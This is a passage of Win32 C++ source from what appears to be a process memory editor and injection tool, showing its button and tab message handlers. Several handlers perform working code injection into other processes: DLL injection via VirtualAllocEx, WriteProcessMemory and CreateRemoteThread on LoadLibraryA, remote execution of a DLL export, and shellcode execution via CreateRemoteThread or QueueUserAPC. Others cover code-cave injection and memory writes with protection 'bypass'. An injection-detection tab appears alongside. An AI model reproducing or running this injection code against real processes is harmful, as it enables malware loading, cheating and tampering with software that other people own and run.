            if (hLstApsResults) {
                int dx = std::max(0, pw - 10);
                int dy = std::max(0, ph - 158);
                SetWindowPos(hLstApsResults, NULL, 5, 148, dx, dy, SWP_NOZORDER);
            }
            if (hLstDwDisasm) {
                int dx = std::max(0, pw - 10);
                int dy = std::max(0, ph - 158);
                SetWindowPos(hLstDwDisasm, NULL, 5, 148, dx, dy, SWP_NOZORDER);
            }
            if (hLstVerify)  SetWindowPos(hLstVerify,  NULL, 5, 254, std::max(0,pw-10), std::max(0,ph-260), SWP_NOZORDER);
            if(hLstDetect){
                int dx = std::max(0,pw-10);
                int dy = std::max(0,ph-400);
                SetWindowPos(hLstDetect,NULL,5,130,dx,dy,SWP_NOZORDER);
                SetWindowPos(hEditDump,NULL,5,ph-240,dx,230,SWP_NOZORDER);
            }
            if (hLstTriggerLog) {
                int dx = std::max(0, pw-10);
                SetWindowPos(hLstTriggerLog, NULL, 5, 100, dx, 200, SWP_NOZORDER);
            }
            if (hLstVerify) {
                int dx = std::max(0, pw - 10);
                int dy = std::max(0, ph - 280);  
                SetWindowPos(hLstVerify, NULL, 5, 254, dx, dy, SWP_NOZORDER);
            }

        }
        break;
    }

    case WM_NOTIFY:{
        NMHDR* nm=(NMHDR*)lParam;
        if(nm->hwndFrom==hTabCtrl&&nm->code==TCN_SELCHANGE){
            int sel=TabCtrl_GetCurSel(hTabCtrl);
            ShowWindow(hPageScan,   sel==0?SW_SHOW:SW_HIDE);
            ShowWindow(hPageMods,   sel==1?SW_SHOW:SW_HIDE);
            ShowWindow(hPageInject, sel==2?SW_SHOW:SW_HIDE);
            ShowWindow(hPageWnd,    sel==3?SW_SHOW:SW_HIDE);
            ShowWindow(hPageDetect, sel==4?SW_SHOW:SW_HIDE);
            ShowWindow(hPageShellcode, sel==5?SW_SHOW:SW_HIDE);
            ShowWindow(hPageVerify,    sel == 6 ? SW_SHOW : SW_HIDE);
            ShowWindow(hPageTrigger,   sel == 7 ? SW_SHOW : SW_HIDE);
            if (hPagePtrHook) ShowWindow(hPagePtrHook, sel == 8 ? SW_SHOW : SW_HIDE);
            if (hPageExpHnd)  ShowWindow(hPageExpHnd,  sel == 9 ? SW_SHOW : SW_HIDE);
            if (hPagePatcher) ShowWindow(hPagePatcher, sel ==10 ? SW_SHOW : SW_HIDE);
            if (hPageAutoPtr) ShowWindow(hPageAutoPtr, sel ==11 ? SW_SHOW : SW_HIDE);
            if (hPageDisasmWalk) ShowWindow(hPageDisasmWalk, sel ==12 ? SW_SHOW : SW_HIDE);
        }
        break;
    }

    case WM_COMMAND:
        switch(LOWORD(wParam)){

        case ID_BTN_BROWSE: ShowProcessListDialog(); break;

        case ID_BTN_SEARCH_NAME:{
            char buf[256];GetWindowTextA(hEditSearchName,buf,256);
            ClearEditText(hScanResultsWnd);
            scanResults.clear();scanPrevVals.clear();
            for(auto& p:SearchProcessesByName(buf)){
                char entry[256];sprintf_s(entry,"PID: %-8d | %s",p.first,p.second.c_str());
                AppendEditText(hScanResultsWnd,entry);
            }
            LogToStatus("Name search complete - type PID and click Attach, or Browse for dialog");
            break;
        }

        case ID_BTN_USE_LAST_TID:
            if (g_lastCreatedThreadId != 0) {
                char buf[32];
                sprintf_s(buf, "%lu", g_lastCreatedThreadId);
                SetWindowTextA(hEditApcTid, buf);
                LogToTrigger("APC TID set from last created thread");
            } else {
                LogToTrigger("No thread has been created yet in this session", true);
            }
            break;

        case ID_BTN_ATTACH:{
            char buf[32];GetWindowTextA(hEditPID,buf,32);
            DWORD pid=(DWORD)atoi(buf);
            if(pid==0){LogToStatus("Enter a valid PID",true);break;}
            if(AttachToProcess(pid)){
                EnableWindow(hBtnFirstScan, TRUE);EnableWindow(hBtnNextScan,  TRUE);
                EnableWindow(hBtnRefreshHex,TRUE);EnableWindow(hBtnGotoOffset,TRUE);
                EnableWindow(hBtnFreeze,    TRUE);EnableWindow(hBtnExport,    TRUE);
                EnableWindow(hBtnWriteUtf8, TRUE);EnableWindow(hBtnWriteUtf16,TRUE);
                EnableWindow(hBtnReadString,TRUE);
            }
            break;
        }

        case ID_BTN_REATTACH:
            if(currentPID){
                char buf[16];sprintf_s(buf,"%d",currentPID);
                SetWindowTextA(hEditPID,buf);
                PostMessage(hWnd,WM_COMMAND,MAKEWPARAM(ID_BTN_ATTACH,BN_CLICKED),(LPARAM)NULL);
            }else LogToStatus("No previous PID to re-attach to",true);
            break;

        case ID_BTN_FIRST_SCAN: DoFirstScan(); break;
        case ID_BTN_NEXT_SCAN:  DoNextScan();  break;

        case ID_BTN_CLEAR_SCAN:
            ClearEditText(hScanResultsWnd);
            scanResults.clear();scanPrevVals.clear();
            UpdateScanCount();
            SetWindowTextA(hStaticAddressInfo,"Selected: None");
            SetSelectedAddress(NULL);
            LogToStatus("Scan results cleared");
            break;

        case ID_BTN_EXPORT: ExportScanResults(); break;

        case ID_BTN_PTR_SCAN:{
            LPVOID addr = GetSelectedAddress();
            if(addr) ScanForPointers(addr);
            else LogToStatus("Select an address first",true);
            break;
        }

        case ID_BTN_COPY_RESULTS: CopyEditToClipboard(hScanResultsWnd); break;
        case ID_BTN_COPY_HEX:     CopyEditToClipboard(hHexViewWnd); break;

        case ID_BTN_COPY_ADDR_CLIP:{
            LPVOID addr = GetSelectedAddress();
            if(addr){
                char buf[32];sprintf_s(buf,"0x%llX",(uintptr_t)addr);
                if(OpenClipboard(hMainWnd)){EmptyClipboard();
                    HGLOBAL hm=GlobalAlloc(GMEM_MOVEABLE,strlen(buf)+1);
                    if(hm){memcpy(GlobalLock(hm),buf,strlen(buf)+1);GlobalUnlock(hm);SetClipboardData(CF_TEXT,hm);}
                    CloseClipboard();LogToStatus("Address copied to clipboard");}
            }else LogToStatus("No address selected",true);
            break;
        }

        case ID_LST_RESULTS:{
            if(HIWORD(wParam)!=EN_CHANGE)break;
            break;
        }

        case ID_BTN_SET_OFFSET:{
            char buf[64];GetWindowTextA(hEditTrackedOffset,buf,64);
            if(buf[0]!='\0'){
                trackedOffset=(LONGLONG)strtoull(buf,NULL,0);hasTrackedOffset=true;
                UpdateOffsetInfo();LogToStatus("Offset tracked");
            }else{
                LPVOID addr = GetSelectedAddress();
                if(addr && hProcess){
                    LPVOID base=GetBaseAddress();
                    if(base){
                        trackedOffset=(LONGLONG)(uintptr_t)addr-(LONGLONG)(uintptr_t)base;
                        hasTrackedOffset=true;
                        char s[32];sprintf_s(s,"0x%llX",trackedOffset);
                        SetWindowTextA(hEditTrackedOffset,s);
                        UpdateOffsetInfo();LogToStatus("Offset locked from selected address");
                    }
                }else LogToStatus("Select an address or type an offset value first",true);
            }
            break;
        }

        case ID_BTN_GOTO_OFFSET:{
            if(!hasTrackedOffset){LogToStatus("No offset tracked yet",true);break;}
            LPVOID base=GetBaseAddress();
            if(!base){LogToStatus("Cannot resolve base address",true);break;}
            LPVOID resolved=(LPVOID)((uintptr_t)base+(uintptr_t)trackedOffset);
            ShowHexAtAddress(resolved,resolved);UpdateOffsetInfo();
            break;
        }

        case ID_BTN_ADD_WATCH:{
            LPVOID addr = GetSelectedAddress();
            if(addr){
                for(LPVOID a:watchList)if(a==addr)goto alreadyInWatch;
                watchList.push_back(addr);RefreshWatchList();
                LogToStatus("Address added to watch list");
                alreadyInWatch:;
            }else LogToStatus("Select an address first",true);
            break;
        }

        case ID_BTN_REM_WATCH:{
            LPVOID addr = GetSelectedAddress();
            for(int i=0;i<(int)watchList.size();i++){
                if(watchList[i]==addr){
                    watchList.erase(watchList.begin()+i);RefreshWatchList();break;
                }
            }
            break;
        }

        case ID_BTN_CLEAR_WATCH:
            watchList.clear();ClearEditText(hLstWatchList);LogToStatus("Watch list cleared");break;

        case ID_BTN_REFRESH_MODS: PopulateModuleList();LogToStatus("Module list refreshed");break;

        case ID_BTN_READ_VAL:{
            LPVOID addr = GetSelectedAddress();
            if(addr){
                int dt=(int)SendMessage(hCmbDataType,CB_GETCURSEL,0,0);
                if(dt==DT_STRING){
                    BYTE raw[256]={};SIZE_T r;
                    ReadProcessMemory(hProcess,addr,raw,255,&r);raw[255]=0;
                    int slen=0;
                    while(slen<(int)r&&raw[slen]>=32&&(unsigned char)raw[slen]<127)slen++;
                    std::string s((char*)raw,slen);
                    SetWindowTextA(hEditNewValue,s.c_str());
                    char buf[300];sprintf_s(buf,"Read string @ 0x%p: \"%s\"",addr,s.c_str());
                    LogToStatus(buf);
                }else{
                    int v=ReadValueFromAddress(addr);
                    SetWindowTextA(hEditNewValue,std::to_string(v).c_str());
                    char buf[128];sprintf_s(buf,"Read 0x%p = %d",addr,v);LogToStatus(buf);
                }
            }else LogToStatus("Select an address first",true);
            break;
        }

        case ID_BTN_REFRESH_HEX:{
            char buf[64];GetWindowTextA(hEditHexAddress,buf,64);
            LPVOID addr=(LPVOID)(uintptr_t)strtoull(buf,NULL,0);
            LPVOID hilite = GetSelectedAddress();
            ShowHexAtAddress(addr, hilite);
            break;
        }

        case ID_BTN_REFRESH_MAP: ShowMemoryMap(); break;

        case ID_BTN_WRITE:{
            LPVOID addr = GetSelectedAddress();
            if(!addr){LogToStatus("Select an address first",true);break;}
            if(!hProcess){LogToStatus("Not attached to a process",true);break;}
            {
                int dt=(int)SendMessage(hCmbDataType,CB_GETCURSEL,0,0);
                char buf[512]={};GetWindowTextA(hEditNewValue,buf,512);
                bool prot=(SendMessage(hChkProtect,BM_GETCHECK,0,0)==BST_CHECKED);
                bool useSyscall=(SendMessage(hChkSyscall,BM_GETCHECK,0,0)==BST_CHECKED);
                if(dt==DT_INT32||dt==DT_FLOAT){
                    Backup4 bk={};ReadProcessMemory(hProcess,addr,bk.data,4,NULL);
                    backups[addr]=bk;
                }
                if(WriteTypedValue(addr,buf,dt,prot,useSyscall)){
                    char msg[256];sprintf_s(msg,"Wrote %s to 0x%p%s",buf,(void*)addr, useSyscall?" (syscall)":(prot?" (bypass)":""));
                    LogToStatus(msg);ShowHexAtAddress(addr,addr);
                    EnableWindow(hBtnUndo,TRUE);
                } else LogToStatus("Write failed — try Bypass checkbox or run as Admin",true);
            }
            break;
        }

        case ID_BTN_UNDO:{
            LPVOID addr = GetSelectedAddress();
            if(addr && backups.count(addr)){
                WriteProcessMemory(hProcess,addr,backups[addr].data,4,NULL);
                int v=ReadValueFromAddress(addr);
                SetWindowTextA(hEditNewValue,std::to_string(v).c_str());
                LogToStatus("Undo successful");ShowHexAtAddress(addr,addr);
            }else LogToStatus("No backup available",true);
            break;
        }

        case ID_BTN_INJECT_DLL:  InjectDLL();  break;
        case ID_BTN_EJECT_DLL:   EjectDLL();   break;
        case ID_BTN_INJECT_CODE: InjectShellcode(); break;
        case ID_BTN_SCAN_CAVES:  ScanCodeCaves(); break;
        case ID_BTN_LIST_THREADS:ListRemoteThreads(); break;

        case ID_BTN_DETECT_SCAN:  RunInjectionDetection(); break;
        case ID_BTN_DETECT_COPY:  CopyEditToClipboard(hLstDetect); break;
        case ID_BTN_DETECT_CLEAR: ClearEditText(hLstDetect); break;
        case ID_BTN_ANALYZE_DUMP: AnalyzeDumpShellcode(); break;
        case ID_BTN_DUMP_SELECTED:{
            DWORD start=0, end=0;
            SendMessage(hLstDetect, EM_GETSEL, (WPARAM)&start, (LPARAM)&end);
            if(start == end) { LogToStatus("Select a line in the detection results first", true); break; }
            int li = (int)SendMessage(hLstDetect, EM_LINEFROMCHAR, (WPARAM)start, 0);
            int ls = (int)SendMessage(hLstDetect, EM_LINEINDEX, (WPARAM)li, 0);
            int ll = (int)SendMessage(hLstDetect, EM_LINELENGTH, (WPARAM)ls, 0);
            if(ll <= 0 || ll >= 1024) { LogToStatus("Invalid line", true); break; }
            std::string buf(ll + 2, '\0');
            buf[0] = (char)(ll & 0xFF); buf[1] = (char)((ll >> 8) & 0xFF);
            SendMessageA(hLstDetect, EM_GETLINE, (WPARAM)li, (LPARAM)&buf[0]);
            const char* p = strstr(buf.c_str(), "0x");
            if(!p) { LogToStatus("No address found in line", true); break; }
            uintptr_t addr = (uintptr_t)strtoull(p, nullptr, 16);
            if(!addr) { LogToStatus("Invalid address", true); break; }
            std::vector<BYTE> data(0x1000);
            SIZE_T read = 0;
            if(!ReadProcessMemory(hProcess, (LPCVOID)addr, data.data(), data.size(), &read) || read == 0) {
                LogToStatus("Failed to read memory", true); break;
            }
            std::string dump;
            char line[128];
            for(size_t i = 0; i < read; i += 16) {
                sprintf_s(line, "%016llX: ", (unsigned long long)(addr + i));
                dump += line;
                for(int j = 0; j < 16; j++) {
                    if(i + j < read) sprintf_s(line, "%02X ", data[i + j]);
                    else strcpy_s(line, "   ");
                    dump += line;
                }
                dump += " ";
                for(int j = 0; j < 16; j++) {
                    char c = (i + j < read) ? data[i + j] : ' ';
                    dump += (c >= 32 && c <= 126) ? c : '.';
                }
                dump += "\r\n";
            }
            SetEditText(hEditDump, dump.c_str());
            char msg[128]; sprintf_s(msg, "Dumped 0x%llX bytes from 0x%llX", (unsigned long long)read, (unsigned long long)addr);
            LogToStatus(msg);
            break;
        }

        case ID_BTN_BROWSE_DLL:{
            char path[MAX_PATH]={};OPENFILENAMEA ofn={};ofn.lStructSize=sizeof(ofn);
            ofn.hwndOwner=hMainWnd;ofn.lpstrFile=path;ofn.nMaxFile=MAX_PATH;
            ofn.lpstrFilter="DLL Files\0*.dll\0All Files\0*.*\0";ofn.lpstrDefExt="dll";
            ofn.Flags=OFN_FILEMUSTEXIST|OFN_PATHMUSTEXIST;
            if(GetOpenFileNameA(&ofn))SetWindowTextA(hEditDllPath,path);
            break;
        }

        case ID_BTN_LOAD_SC_FILE:{
            char path[MAX_PATH]={};OPENFILENAMEA ofn={};ofn.lStructSize=sizeof(ofn);
            ofn.hwndOwner=hMainWnd;ofn.lpstrFile=path;ofn.nMaxFile=MAX_PATH;
            ofn.lpstrFilter="Binary Files\0*.bin;*.sc;*.raw\0All Files\0*.*\0";ofn.Flags=OFN_FILEMUSTEXIST;
            if(!GetOpenFileNameA(&ofn))break;
            FILE* f=nullptr;fopen_s(&f,path,"rb");
            if(!f){LogToStatus("Could not open shellcode file",true);break;}
            fseek(f,0,SEEK_END);long sz=ftell(f);rewind(f);
            if(sz<=0||sz>4096){fclose(f);LogToStatus("File too large or empty (max 4096)",true);break;}
            std::vector<BYTE> raw((size_t)sz);fread(raw.data(),1,sz,f);fclose(f);
            std::string hex;
            for(size_t i=0;i<raw.size();i++){char h[4];sprintf_s(h,"%02X ",raw[i]);hex+=h;}
            SetWindowTextA(hEditShellcode,hex.c_str());
            char msg[128];sprintf_s(msg,"Loaded %ld bytes from %s",sz,path);LogToStatus(msg);
            break;
        }

        case ID_BTN_ASSEMBLER: ShowAssemblerWindow(); break;

        case ID_BTN_SEND_TO_BUILDER:{
            LPVOID addr = GetSelectedAddress();
            if(addr){
                char buf[32];sprintf_s(buf,"0x%llX",(uintptr_t)addr);
                SetWindowTextA(hEditScAddr,buf);
                LogToStatus("Address sent to Shellcode Builder");
            }else LogToStatus("Select a scan result first",true);
            break;
        }

        case ID_BTN_BUILD_SC: BuildShellcode(); break;

        case ID_BTN_COPY_SC:{
            char buf[512]={};GetWindowTextA(hEditScResult,buf,512);
            SetWindowTextA(hEditShellcode,buf);LogToStatus("Shellcode copied to inj field");
            break;
        }

        case ID_BTN_FREEZE:{
            LPVOID addr = GetSelectedAddress();
            if(!addr){LogToStatus("Select an address first",true);break;}
            freezeActive=!freezeActive;
            if(freezeActive){
                int dt=(int)SendMessage(hCmbDataType,CB_GETCURSEL,0,0);
                char buf[512]={};GetWindowTextA(hEditNewValue,buf,512);
                memset(freezeBytes,0,sizeof(freezeBytes));freezeByteLen=4;
                switch(dt){
                    case DT_INT8:  {int8_t  v=(int8_t)atoi(buf);  memcpy(freezeBytes,&v,1);freezeByteLen=1;break;}
                    case DT_INT16: {int16_t v=(int16_t)atoi(buf); memcpy(freezeBytes,&v,2);freezeByteLen=2;break;}
                    case DT_INT64: {int64_t v=_strtoi64(buf,NULL,10);memcpy(freezeBytes,&v,8);freezeByteLen=8;break;}
                    case DT_FLOAT: {float   v=(float)atof(buf);   memcpy(freezeBytes,&v,4);freezeByteLen=4;break;}
                    case DT_DOUBLE:{double  v=atof(buf);           memcpy(freezeBytes,&v,8);freezeByteLen=8;break;}
                    default:       {int32_t v=atoi(buf);           memcpy(freezeBytes,&v,4);freezeByteLen=4;break;}
                }
                SetTimer(hWnd,TIMER_FREEZE,50,NULL);
                SetWindowTextA(hBtnFreeze,"Unfreeze");
                char msg[128];sprintf_s(msg,"Freezing 0x%p  (%zu bytes)",addr,freezeByteLen);LogToStatus(msg);
            }else{
                KillTimer(hWnd,TIMER_FREEZE);SetWindowTextA(hBtnFreeze,"Freeze");LogToStatus("Freeze disabled");
            }
            break;
        }

        case ID_BTN_WRITE_UTF8:{
            LPVOID addr = GetSelectedAddress();
            if(addr) WriteStringToAddress(addr,false,(SendMessage(hChkSyscall,BM_GETCHECK,0,0)==BST_CHECKED));
            else LogToStatus("No address selected",true);
            break;
        }
        case ID_BTN_WRITE_UTF16:{
            LPVOID addr = GetSelectedAddress();
            if(addr) WriteStringToAddress(addr,true,(SendMessage(hChkSyscall,BM_GETCHECK,0,0)==BST_CHECKED));
            else LogToStatus("No address selected",true);
            break;
        }
        case ID_BTN_READ_STRING:{
            LPVOID addr = GetSelectedAddress();
            if(addr) ReadStringAtAddress(addr);
            else LogToStatus("No address selected",true);
            break;
        }

        case ID_BTN_AOB_PATCH: DoAobPatchReplace(); break;

        case ID_BTN_REFRESH_WNDS: EnumerateProcessWindows(); break;

        case ID_BTN_SEND_SETTEXT:{
            HWND target=ParseHWNDFromEditLine(hLstWindows);
            if(!target){LogToStatus("Click a window/control line first",true);break;}
            if(!IsWindow(target)){LogToStatus("That HWND is no longer valid",true);break;}
            char txt[1024]={};GetWindowTextA(hEditWndText,txt,1024);
            DWORD_PTR res=0;
            LRESULT r=SendMessageTimeoutA(target,WM_SETTEXT,0,(LPARAM)txt,
                SMTO_ABORTIFHUNG|SMTO_NORMAL,3000,&res);
            char msg[256];
            if(r) sprintf_s(msg,"WM_SETTEXT -> 0x%p  OK",(void*)target);
            else  sprintf_s(msg,"WM_SETTEXT -> 0x%p  FAILED (timed out or rejected)",(void*)target);
            LogToStatus(msg,!r);
            break;
        }

        case ID_BTN_SEND_GETTEXT:{
            HWND target=ParseHWNDFromEditLine(hLstWindows);
            if(!target){LogToStatus("Click a window/control line first",true);break;}
            if(!IsWindow(target)){LogToStatus("That HWND is no longer valid",true);break;}
            DWORD_PTR len=0;
            SendMessageTimeout(target,WM_GETTEXTLENGTH,0,0,SMTO_ABORTIFHUNG|SMTO_NORMAL,2000,&len);
            if(len==0){
                LogToStatus("WM_GETTEXTLENGTH returned 0 (control may be empty)",true);break;
            }
            std::string buf(len+2,'\0');
            DWORD_PTR got=0;
            SendMessageTimeoutA(target,WM_GETTEXT,(WPARAM)(len+1),(LPARAM)&buf[0],
                SMTO_ABORTIFHUNG|SMTO_NORMAL,3000,&got);
            SetWindowTextA(hEditWndText,buf.c_str());
            char msg[300];
            sprintf_s(msg,"Got text from 0x%p  (%llu chars): \"%.*s%s\"",(void*)target,
                (unsigned long long)got,
                got>60?60:(int)got,buf.c_str(),got>60?"...":"");
            LogToStatus(msg);
            break;
        }

        case ID_BTN_WRITE_ALL:  WriteAllScanResults(); break;
        case ID_BTN_SUSPEND_THR:SuspendResumeProcess(true);  break;
        case ID_BTN_RESUME_THR: SuspendResumeProcess(false); break;
        case ID_BTN_KILL_THREAD:KillSelectedThread(); break;
        case ID_BTN_COPY_TID_TO_APC:
            {
                int selStart = 0, selEnd = 0;
                SendMessage(hLstThreads, EM_GETSEL, (WPARAM)&selStart, (LPARAM)&selEnd);
                if (selStart == selEnd) {
                    LogToStatus("No thread selected – click a line in the thread list first", true);
                    break;
                }
                int lineIdx = (int)SendMessage(hLstThreads, EM_LINEFROMCHAR, (WPARAM)selStart, 0);
                int lineStart = (int)SendMessage(hLstThreads, EM_LINEINDEX, (WPARAM)lineIdx, 0);
                int lineLen = (int)SendMessage(hLstThreads, EM_LINELENGTH, (WPARAM)lineStart, 0);
                if (lineLen <= 0 || lineLen >= 256) {
                    LogToStatus("Invalid line length", true);
                    break;
                }
                std::string buf(lineLen + 2, '\0');
                buf[0] = (char)(lineLen & 0xFF);
                buf[1] = (char)((lineLen >> 8) & 0xFF);
                SendMessageA(hLstThreads, EM_GETLINE, (WPARAM)lineIdx, (LPARAM)&buf[0]);
        
                const char* p = strstr(buf.c_str(), "TID: ");
                if (!p) {
                    LogToStatus("Could not parse TID from line", true);
                    break;
                }
                DWORD tid = (DWORD)atoi(p + 5);
                if (tid == 0) {
                    LogToStatus("Invalid TID", true);
                    break;
                }
        
                char tidStr[32];
                sprintf_s(tidStr, "%lu", tid);
                SetWindowTextA(hEditApcTid, tidStr);
        
                char msg[128];
                sprintf_s(msg, "Copied TID %lu to APC field", tid);
                LogToStatus(msg);
        
                TabCtrl_SetCurSel(hTabCtrl, 7);  
            }
            break;
        case ID_BTN_CAVE_INJECT:InjectIntoCodeCave(); break;

        case ID_BTN_WND_FOCUS:
            if(!g_targetWnd||!IsWindow(g_targetWnd)){LogToStatus("No window selected",true);break;}
            SetForegroundWindow(g_targetWnd);
            {char m[64];sprintf_s(m,"Set foreground: 0x%p",(void*)g_targetWnd);LogToStatus(m);}
            break;
        case ID_BTN_WND_HIDE:
            if(!g_targetWnd||!IsWindow(g_targetWnd)){LogToStatus("No window selected",true);break;}
            ShowWindow(g_targetWnd,SW_HIDE);
            {char m[64];sprintf_s(m,"Hidden: 0x%p",(void*)g_targetWnd);LogToStatus(m);}
            break;
        case ID_BTN_WND_SHOW:
            if(!g_targetWnd||!IsWindow(g_targetWnd)){LogToStatus("No window selected",true);break;}
            ShowWindow(g_targetWnd,SW_SHOW);
            {char m[64];sprintf_s(m,"Shown: 0x%p",(void*)g_targetWnd);LogToStatus(m);}
            break;
        case ID_BTN_WND_ENABLE:
            if(!g_targetWnd||!IsWindow(g_targetWnd)){LogToStatus("No window selected",true);break;}
            EnableWindow(g_targetWnd,TRUE);
            {char m[64];sprintf_s(m,"Enabled: 0x%p",(void*)g_targetWnd);LogToStatus(m);}
            break;
        case ID_BTN_WND_DISABLE:
            if(!g_targetWnd||!IsWindow(g_targetWnd)){LogToStatus("No window selected",true);break;}
            EnableWindow(g_targetWnd,FALSE);
            {char m[64];sprintf_s(m,"Disabled: 0x%p",(void*)g_targetWnd);LogToStatus(m);}
            break;
        case ID_BTN_WND_MIN:
            if(!g_targetWnd||!IsWindow(g_targetWnd)){LogToStatus("No window selected",true);break;}
            ShowWindow(g_targetWnd,SW_MINIMIZE);
            {char m[64];sprintf_s(m,"Minimized: 0x%p",(void*)g_targetWnd);LogToStatus(m);}
            break;
        case ID_BTN_WND_MAX:
            if(!g_targetWnd||!IsWindow(g_targetWnd)){LogToStatus("No window selected",true);break;}
            ShowWindow(g_targetWnd,SW_MAXIMIZE);
            {char m[64];sprintf_s(m,"Maximized: 0x%p",(void*)g_targetWnd);LogToStatus(m);}
            break;
        case ID_BTN_WND_RESTORE:
            if(!g_targetWnd||!IsWindow(g_targetWnd)){LogToStatus("No window selected",true);break;}
            ShowWindow(g_targetWnd,SW_RESTORE);
            {char m[64];sprintf_s(m,"Restored: 0x%p",(void*)g_targetWnd);LogToStatus(m);}
            break;
        case ID_BTN_WND_CLOSE_W:
            if(!g_targetWnd||!IsWindow(g_targetWnd)){LogToStatus("No window selected",true);break;}
            PostMessage(g_targetWnd,WM_CLOSE,0,0);
            {char m[64];sprintf_s(m,"Sent WM_CLOSE: 0x%p",(void*)g_targetWnd);LogToStatus(m);}
            break;

        case ID_BTN_WND_POSTMSG:{
            if(!g_targetWnd||!IsWindow(g_targetWnd)){LogToStatus("No window selected",true);break;}
            char bMsg[16]={},bWP[32]={},bLP[32]={};
            GetWindowTextA(hEditWndMsg,  bMsg,16);
            GetWindowTextA(hEditWndWParam,bWP,32);
            GetWindowTextA(hEditWndLParam,bLP,32);
            UINT   uMsg  =(UINT)  strtoul(bMsg,nullptr,0);
            WPARAM wPar  =(WPARAM)strtoull(bWP,nullptr,0);
            LPARAM lPar  =(LPARAM)strtoull(bLP,nullptr,0);
            BOOL ok=PostMessage(g_targetWnd,uMsg,wPar,lPar);
            char msg[128];sprintf_s(msg,"PostMessage(0x%04X,0x%llX,0x%llX) %s",uMsg,
                (unsigned long long)wPar,(unsigned long long)lPar,ok?"OK":"FAILED");
            LogToStatus(msg,!ok);
            break;
        }

        case ID_BTN_WND_SENDCMD:{
            if(!g_targetWnd||!IsWindow(g_targetWnd)){LogToStatus("No window selected",true);break;}
            char bId[16]={};GetWindowTextA(hEditWndCmdId,bId,16);
            WORD cmdId=(WORD)strtoul(bId,nullptr,0);
            BOOL ok=PostMessage(g_targetWnd,WM_COMMAND,MAKEWPARAM(cmdId,0),(LPARAM)g_targetWnd);
            char msg[128];sprintf_s(msg,"WM_COMMAND(ID=%u) -> 0x%p  %s",cmdId,(void*)g_targetWnd,ok?"OK":"FAILED");
            LogToStatus(msg,!ok);
            break;
        }

        case ID_BTN_EXEC_SHELLCODE:{
            if(!hProcess||!currentPID){LogToStatus("Attach to a process first",true);break;}
            char addrStr[256]={};GetWindowTextA(hEditShellAddr,addrStr,256);
            uintptr_t addr=(uintptr_t)strtoull(addrStr,nullptr,0);
            if(!addr){LogToStatus("Enter a valid address",true);break;}
            HANDLE hThread=CreateRemoteThread(hProcess,NULL,0,(LPTHREAD_START_ROUTINE)addr,NULL,0,NULL);
            if(hThread){
                CloseHandle(hThread);
                char msg[128];sprintf_s(msg,"Executed shellcode at 0x%llX",(unsigned long long)addr);
                LogToStatus(msg);
            }else{
                LogToStatus("Failed to execute shellcode",true);
            }
            break;
        }

        case ID_BTN_EXEC_APC:{
            if(!hProcess||!currentPID){LogToStatus("Attach to a process first",true);break;}
            char addrStr[256]={};GetWindowTextA(hEditShellAddr,addrStr,256);
            uintptr_t addr=(uintptr_t)strtoull(addrStr,nullptr,0);
            if(!addr){LogToStatus("Enter a valid address",true);break;}
            char tidStr[256]={};GetWindowTextA(hEditThreadId,tidStr,256);
            DWORD tid=(DWORD)strtoul(tidStr,nullptr,0);
            if(!tid){LogToStatus("Enter a valid thread ID for APC",true);break;}
            HANDLE hThread=OpenThread(THREAD_SET_CONTEXT,FALSE,tid);
            if(!hThread){LogToStatus("Failed to open thread",true);break;}
            if(QueueUserAPC((PAPCFUNC)addr,hThread,0)){
                LogToStatus("APC queued to thread");
            }else{
                LogToStatus("Failed to queue APC",true);
            }
            CloseHandle(hThread);
            break;
        }

        case ID_BTN_SC_BROWSE_DLL:{
            OPENFILENAMEA ofn={};
            char path[MAX_PATH]={};
            ofn.lStructSize=sizeof(ofn);ofn.hwndOwner=hWnd;
            ofn.lpstrFilter="DLL Files (*.dll)\0*.dll\0All Files\0*.*\0";
            ofn.lpstrFile=path;ofn.nMaxFile=MAX_PATH;
            ofn.lpstrTitle="Select DLL to Inject";ofn.Flags=OFN_FILEMUSTEXIST;
            if(GetOpenFileNameA(&ofn)){
                SetWindowTextA(hEditScDllPath,path);
                LogToStatus("DLL path selected");
            }
            break;
        }

        case ID_BTN_SC_EXEC_DLL_EXPORT:{
            if(!hProcess||!currentPID){
                LogToStatus("Attach to a process first",true);
                break;
            }
            char dllPath[MAX_PATH]={}; GetWindowTextA(hEditScDllPath,dllPath,MAX_PATH);
            if(!dllPath[0]){ LogToStatus("Select a DLL file first",true); break; }
            char funcName[256]={}; GetWindowTextA(hEditScExportFunc,funcName,256);
            if(!funcName[0]){ LogToStatus("Enter export function name",true); break; }
            
            LPVOID pRemotePath = VirtualAllocEx(hProcess, NULL, strlen(dllPath)+1, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
            if(!pRemotePath){ LogToStatus("VirtualAllocEx failed for DLL path",true); break; }
            SIZE_T written=0;
            if(!WriteProcessMemory(hProcess, pRemotePath, dllPath, strlen(dllPath)+1, &written)){
                VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
                LogToStatus("WriteProcessMemory failed for DLL path",true); break;
            }
            HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pRemotePath, 0, NULL);
            if(!hThread){
                VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
                LogToStatus("CreateRemoteThread (LoadLibrary) failed",true); break;
            }
            WaitForSingleObject(hThread, 10000);
            DWORD hMod=0;
            GetExitCodeThread(hThread, &hMod);
            CloseHandle(hThread);
            VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
            if(!hMod){
                LogToStatus("LoadLibrary failed – DLL not loaded (maybe x86/x64 mismatch)",true);
                break;
            }
            
            HMODULE remoteBase = FindModuleByPath(currentPID, dllPath);
            if(!remoteBase){
                LogToStatus("DLL loaded but could not locate its base address (module enumeration)",true);
                break;
            }
            
            DWORD rva = GetExportRVA(dllPath, funcName);
            if(rva==0){
                char err[512]; sprintf_s(err,"Export '%s' not found in DLL", funcName);
                LogToStatus(err,true);
                break;
            }
            
            LPVOID remoteFunc = (LPVOID)((uintptr_t)remoteBase + rva);
            hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteFunc, NULL, 0, NULL);
            if(hThread){
                CloseHandle(hThread);
                char okMsg[512]; sprintf_s(okMsg,"Executed DLL export '%s' at 0x%p", funcName, remoteFunc);
                LogToStatus(okMsg);
                PopulateModuleList();
            }else{
                LogToStatus("CreateRemoteThread for export failed",true);
            }
            break;
        }

        case ID_BTN_HELP_MODULES:
            MessageBoxA(hWnd,
                "=== MODULES & DLL TAB ===\n\n"
                "[Module List]\n"
